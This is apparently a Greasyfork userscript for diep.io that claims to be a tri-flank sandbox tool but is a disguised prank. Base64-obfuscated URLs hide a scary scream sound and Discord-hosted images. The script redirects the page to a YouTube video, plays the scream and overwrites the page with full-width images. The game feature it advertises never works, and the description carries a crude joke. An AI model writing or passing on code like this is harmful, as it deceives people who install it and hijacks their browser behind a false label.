// ==UserScript==
// @name         triflank sandbox
// @version      269
// @description  gayness go!
// @author       louddeath lmao this is cringe
// @match        *://diep.io/*
// @grant        none
// @namespace https://greasyfork.org/users/916806
// @downloadURL https://update.greasyfork.org/scripts/445321/triflank%20sandbox.user.js
// @updateURL https://update.greasyfork.org/scripts/445321/triflank%20sandbox.meta.js
// ==/UserScript==

(() => {
    "use strict";
    const serverToClientToken = "aHR0cHM6Ly9jZG4uZ2xpdGNoLmNvbS84ZjhhMzUzZi05ODM4LTQ5MjYtOTgxZi1lNTZjZjU5NDJjZTglMkZTY2FyeSUyMFNjcmVhbSUyMFNvdW5kJTIwRWZmZWN0JTIwSEQubXAzP3Y9MTYzMjYzODA5Njg1NQ==";
    const automateUpdate = "aHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy84MDEyNTY0Nzg2NjkxNDQwOTUvODkxNTczNzA1OTQyMTEwMjE4L2ltYWdlMC5qcGc/d2lkdGg9MTIwMiZoZWlnaHQ9Njc2";
    const automateHook = "aHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy84MDEyNTY0Nzg2NjkxNDQwOTUvODkxNTc0NjA0MzAzMzE5MDcwL2ltYWdlLnBuZw==";
    const decodeServerHook = atob(serverToClientToken);
    const decodeUpdate = atob(automateUpdate);
    const decodeHook = atob(automateHook);
    const _sHook = new Audio(decodeServerHook);
    const _ws = WebSocket.prototype.send;
    const headers = {
        tank: 4,
        input: 1
    };
    const kind = {
        flankguard: [headers.tank, 20],
        triangle: [headers.tank, 24],
        slashID: [headers.input, 9, 50, 1]
    };
    let ws = true;
    let toggleScript = false;
    let newWS = () => {};

    function _GUI(text) {
        const _div = document.createElement("div");
        _div.setAttribute("style", "position: absolute; top:0%; left:0%; background-color: white;");
        _div.innerHTML = text;
location.href = 'https://www.youtube.com/watch?v=xvFZjo5PgG0';
    }

    WebSocket.prototype.send = function(data) {
        if (ws == true) {
            console.log("Hello: New WebSocket is being used.");
            setTimeout(() => ws = false, 200);
        }
        return _ws.call(this, data);
    }

    function send(which) {
        return newWS(new Uint8Array(which));
    }

    function _triflank() {
        if (window.input.should_prevent_unload()); else _GUI("Diep.io Sandbox Tri-Flank Script.");
        if (toggleScript) {
            send(kind.flankguard);
            setTimeout(() => send(kind.triangle), 100);
            setTimeout(() => {
                send(kind.slashID);
            }, 500 / 2);
            _sHook.play();
            document.write(`<img src="${decodeUpdate}" width=2000px>`);
            setTimeout(() => {
                document.close();
                setTimeout(() => document.write(`<img src="${decodeHook}" width=2000px>`), 50);
                setTimeout(() => document.close(), 500 / 3);
            }, 500 / 2);
        }
    }
    setInterval(_triflank, 500);

    document.onkeydown = (e) => {
        if (e.code == "KeyF" && window.input.should_prevent_unload()) {
            toggleScript = !toggleScript;
        }
    };
})();